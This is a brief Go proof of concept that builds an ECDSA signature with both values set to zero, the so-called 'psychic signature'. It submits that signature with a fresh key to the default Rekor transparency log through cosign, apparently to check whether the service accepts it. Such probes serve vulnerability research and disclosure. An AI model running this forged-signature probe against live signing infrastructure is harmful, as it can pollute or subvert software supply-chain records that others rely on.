package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"log"
	"math/big"

	"github.com/sigstore/cosign/pkg/cosign"
	rekor "github.com/sigstore/rekor/pkg/generated/client"
	"github.com/sigstore/sigstore/pkg/cryptoutils"

	"golang.org/x/crypto/cryptobyte"
	"golang.org/x/crypto/cryptobyte/asn1"
)

func BadSig() []byte {
	var b cryptobyte.Builder
	b.AddASN1(asn1.SEQUENCE, func(b *cryptobyte.Builder) {
		b.AddASN1BigInt(big.NewInt(0))
		b.AddASN1BigInt(big.NewInt(0))
	})
	sig, err := b.Bytes()
	if err != nil {
		log.Fatalf("Error serializing sig: %v", err)
	}
	return sig
}

func main() {
	payload := make([]byte, 0)
	sig := BadSig()
	sigB64 := base64.StdEncoding.EncodeToString(sig)
	log.Printf("Base 64 psychic signature: %s", sigB64)
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		log.Fatalf("Error generating pubkey: %v", err)
	}
	pubKeyPEM, err := cryptoutils.MarshalPublicKeyToPEM(key.Public())
	if err != nil {
		log.Fatalf("Error serializing pubkey: %v", err)
	}
	logEntry, err := cosign.TLogUpload(context.Background(), rekor.Default, sig, payload, pubKeyPEM)
	if err != nil {
		log.Fatalf("Error uploading to tlog: %v", err)
	}
	fmt.Printf("uploaded: %v", logEntry)
}
